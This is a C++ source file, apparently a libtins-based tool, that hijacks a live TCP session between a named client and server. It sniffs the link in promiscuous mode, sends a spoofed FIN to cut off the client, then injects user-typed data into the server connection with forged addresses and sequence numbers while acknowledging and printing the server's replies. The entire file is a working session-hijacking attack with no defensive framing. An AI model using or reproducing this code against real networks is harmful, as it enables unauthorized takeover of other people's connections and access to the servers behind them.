#include <iostream>
#include <thread>
#include <atomic>
#include <bitset>

#include <tins/ip.h>
#include <tins/tcp.h>
#include <tins/sniffer.h>
#include <tins/packet_sender.h>
#include <tins/rawpdu.h>

#include <arpa/inet.h>

#undef DEBUG

int main(int argc, char** argv) {
    // Check number of arguments
    if (argc != 5) {
        std::cout << "Usage: " << argv[0] << " <client> <server> <port> <interface>" << std::endl;
        return 1;
    }

    // Unpacks parameters
    std::string client = argv[1];
    std::string server = argv[2];
    std::string port = argv[3];
    std::string device_name = argv[4];

    // Create tins sniffer
    Tins::SnifferConfiguration config;
    config.set_filter("tcp and host " + client + " and host " + server + " and port " + port);
    config.set_promisc_mode(true);
    config.set_immediate_mode(true);

    Tins::Sniffer sniffer(device_name, config);

    // Creates sender
    Tins::PacketSender sender(device_name);

    // Wait until an ACK is received from server
    Tins::TCP ack;
    sniffer.sniff_loop([&](Tins::PDU& pdu){
        // Get IP layer
        const Tins::IP& ip = pdu.rfind_pdu<Tins::IP>();

        // Get TCP layer
        const Tins::TCP& tcp = pdu.rfind_pdu<Tins::TCP>();

        std::cout << "Packet!" << std::endl;
        std::cout << "Flags: " << std::bitset<12>(tcp.flags()) << std::endl;
        std::cout << "Source: " << ip.src_addr().to_string() << std::endl;

        // Check if ACK and from server
        if ((tcp.flags() & Tins::TCP::ACK) &&
            ip.src_addr() == Tins::IPv4Address(server)) {
            std::cout << "ACK received from server." << std::endl;
            ack = tcp;
            return false;
        }
        
        return true;
    });

    // Disconnects client
    Tins::TCP rst = Tins::TCP(ack.dport(), ack.sport());
    rst.flags(Tins::TCP::FIN | Tins::TCP::ACK);
    rst.seq(ack.seq());
    rst.ack_seq(ack.ack_seq());
    rst.window(ack.window());
    
    Tins::IP ip_rst = Tins::IP(client, server) / rst;
    sender.send(ip_rst);
    std::cout << "FIN sent to client." << std::endl;

    // Prints prompt
    std::cout << "All yours!" << std::endl;
#ifdef TELNET
    std::cout << ">> ";
#endif // TELNET

    // Spawns sender thread
    std::atomic<uint32_t> seq_val = ack.ack_seq();
    std::atomic<uint32_t> ack_val = ack.seq();
    std::thread sender_thread([&]() {
        for (;;) {
            // Reads message from stdin to be sent
            std::string message;
            std::getline(std::cin, message);
            message += "\n";

            // Creates TCP packet
            Tins::TCP tcp = Tins::TCP(ack.sport(), ack.dport())/ Tins::RawPDU(message);
            tcp.flags(Tins::TCP::PSH | Tins::TCP::ACK);
            tcp.seq(seq_val);
            tcp.ack_seq(ack_val);
            tcp.window(ack.window());

            // Creates IP packet
            Tins::IP ip = Tins::IP(server, client) / tcp;

            // Sends packet
            sender.send(ip);

            // Prints prompt
#ifdef TELNET
            std::cout << ">> ";
#endif // TELNET
        }
    });

    // Treats incoming packets
    sniffer.sniff_loop([&](Tins::PDU &pdu) {
        // Get IP layer
        const Tins::IP& ip = pdu.rfind_pdu<Tins::IP>();

        // Drops if not from server
        if (ip.src_addr() != Tins::IPv4Address(server)) 
            return true;

        // Get TCP layer
        const Tins::TCP& tcp = pdu.rfind_pdu<Tins::TCP>();

        // Check if ACK and from server
#ifdef DEBUG
        std::cout << "Packet received" << std::endl;
        std::cout << "Flags: " << std::bitset<12>(tcp.flags()) << std::endl;
        std::cout << "Source: " << ip.src_addr().to_string() << std::endl;
#endif // DEBUG
        if (tcp.flags() == Tins::TCP::ACK) {
            seq_val = tcp.ack_seq();

#ifdef DEBUG
            std::cout << "ACK seq: " << seq_val << std::endl;
            std::cout << "ACK ack: " << ack_val << std::endl;
#endif // DEBUG
        }
        
        // Check if PSH
        if (tcp.flags() == (Tins::TCP::PSH | Tins::TCP::ACK)) {
            // Get TCP Payload
            const Tins::RawPDU& raw = tcp.rfind_pdu<Tins::RawPDU>();
            ack_val = tcp.seq() + raw.payload_size();
            
            // Constructs ACK packet
            Tins::TCP ack_pkt = Tins::TCP(ack.sport(), ack.dport());
            ack_pkt.flags(Tins::TCP::ACK | Tins::TCP::URG);
            ack_pkt.seq(seq_val);
            ack_pkt.ack_seq(ack_val);
            ack_pkt.window(tcp.window());

            // Sends ACK packet
            Tins::IP ip_ack = Tins::IP(server, client) / ack_pkt;
            sender.send(ip_ack);

            // Converts payload to string
            std::string message;
            for (size_t i = 0; i < raw.payload_size(); i++)
                message += raw.payload()[i];

            // Prints message
#ifdef TELNET
            std::cout << '\n' << message << std::endl;
            std::cout << ">> " << std::flush;
#else
            std::cout << message << std::flush;
#endif // TELNET
        }

        return true;
    });

    // Waits for threads to finish
    sender_thread.join();

    return 0;
}   